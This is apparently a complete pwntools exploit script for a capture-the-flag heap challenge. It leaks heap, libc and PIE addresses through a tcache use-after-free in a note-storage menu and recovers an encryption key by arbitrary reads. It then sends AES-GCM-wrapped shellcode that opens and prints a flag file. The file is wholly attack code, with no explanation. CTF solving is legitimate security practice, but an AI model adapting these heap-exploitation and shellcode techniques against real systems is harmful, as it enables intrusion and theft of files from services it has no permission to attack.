from binascii import unhexlify, hexlify
from pwn import *
from crypto_part import gcm_decrypt, gcm_encrypt
context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './chall'
HOST = 'challs.xmas.htsp.ro'
PORT = 2007

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
    for line in lines :
        if TARGET[2:] in line.split('/')[-1] :
            break
    return int(line.split('-')[0], 16)
    # return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

def store(idx, note, text):
    r.sendlineafter('> ', '1')
    r.sendlineafter(': ', str(idx))
    r.sendafter(': ', note)
    r.sendafter(': ', text)

def decrypt(idx):
    r.sendlineafter('> ', '2')
    r.sendlineafter(': ', str(idx))

def edit(idx, note, text):
    r.sendlineafter('> ', '3')
    r.sendlineafter(': ', str(idx))
    r.sendafter(': ', note)
    r.sendafter(': ', text)

def delete(idx):
    r.sendlineafter('> ', '4')
    r.sendlineafter(': ', str(idx))

r = start()
if args.D:
    debug(r, [0x3102])

for i in range(8):
    store(i, '\x00'*8, '\x00'*0x80)

for i in range(8):
    delete(7-i)
decrypt(0)
r.recvuntil('Note (raw): ')

def hex2int(inp):
    out = 0
    for i in range(8):
        out += int(inp[i*2:i*2+2], 16) << (i*8)
    return out

text = r.recvuntil('\n', True)
leak = hex2int(text)
heap = leak - 0xb90
dbg('leak')
dbg('heap')

r.recvuntil('Text (raw): ')
r.recv(16)
text = r.recv(16)
leak = hex2int(text)
dbg('leak')
base = leak - 0x1ebbe0
dbg('base')
environ = base + 0x1ef2e0

for i in range(7):
    store(0, '\xff', '\xff')
store(0, '\xee', '\xee')
store(1, '\xdd', '\xdd')
delete(1)
delete(0)
edit(0, p16(heap+0x16f0 & 0xffff), '\x00')

store(1, '\xcc', '\xcc')
store(0, p64(environ), '\xbb')

decrypt(7)
r.recvuntil('Note (raw): ')
text = r.recvuntil('\n', True)
leak = hex2int(text)

target = leak - 0x100+0x38 # start+0
edit(0, p64(target), '\x00')
decrypt(7)
r.recvuntil('Note (raw): ')
text = r.recvuntil('\n', True)
leak = hex2int(text)

pie = leak - 0x2350
pie_key_addr = pie + 0x8090

edit(0, p64(pie_key_addr), '\x00')

delete(2) # adjust tcache

decrypt(7)
r.recvuntil('Note (raw): ')
text = r.recvuntil('\n', True)
leak = hex2int(text)

key_addr = leak

key = ''
for i in range(4):
    edit(0, p64(key_addr+8*i), '\x00')
    delete(3+i) # adjust tcache

    decrypt(7)
    r.recvuntil('Note (raw): ')
    text = r.recvuntil('\n', True)
    leak = hex2int(text)
    key += p64(leak)

print hexdump(key)

pt = ''
pt += 'geampara'
pt += 'AAAAA'
pt += asm('''
    mov rax, 2
    lea rdi, file[rip]
    xor esi, esi
    xor edx, edx
    syscall
    mov rdi, rax
    xor eax, eax
    lea rsi, file[rip]
    mov rdx, 0x100
    syscall
    mov rax, 1
    mov rdi, 1
    lea rsi, file[rip]
    mov rdx, 0x100
    syscall
file: .asciz "/home/ctf/flag.txt"
''')
pt = pt.ljust(0x80)
print hexdump(pt)

nonce = '\x00'*0xc
note = 'AAAABBBB'
ct, tag = gcm_encrypt(nonce, key, note, pt)

def byte2hex(inp):
    out = ''
    for c in inp:
        out += hex(ord(c))[2:].zfill(2)
    return out

r.sendlineafter('> ', '1337')
r.sendlineafter(': ', byte2hex(note))
r.sendlineafter(': ', byte2hex(ct))
r.sendlineafter(': ', byte2hex(nonce))
r.sendlineafter(': ', byte2hex(tag))

r.interactive()
r.close()
